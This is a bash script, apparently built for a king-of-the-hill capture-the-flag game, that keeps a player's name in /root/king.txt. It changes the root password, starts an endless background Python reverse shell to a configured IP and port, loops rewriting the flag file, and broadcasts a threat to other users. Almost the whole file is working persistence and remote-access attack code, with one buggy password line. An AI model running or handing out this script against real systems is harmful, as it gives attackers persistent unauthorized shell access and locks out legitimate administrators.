# A script to keep your username in the king.txt
# Authors : Cipher and p4p1

# Usage : 
#        chmod +x <filename>
#        sudo bash <filename>
NAME=Cipher007  #change this
PASS=seriously?   #change this
IP=127.0.0.1    #change this
PORT=4444       #change this


echo "[*]Changing password of root"
echo $PASS | passwd $NEW      #changes the root password
echo "[+] Passowrd changed! LMAO"

# Infinite Reverse shell
while [ 1 ]; do
	python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${IP}',${PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" &> /dev/null
done &
disown

count=1

while [ 1 ]; do
	LOG=$(cat /root/king.txt)
	if [[ $LOG != $NAME ]]; then
		echo "[*] modification observed."
		echo $NAME > /root/king.txt #puts your username back into the file
		echo "[+] got things fixed! nothing to worry about!"
		let 'count+=1'
	fi

	if [ $count -eq 4 ]; then
		wall "Stay outta here or face the consequences!"     #asking him to stay out! not politely though!
		echo "[*] $count changes made in king.txt! Find this dude immediately!"
		let 'count+=1'
	fi

done

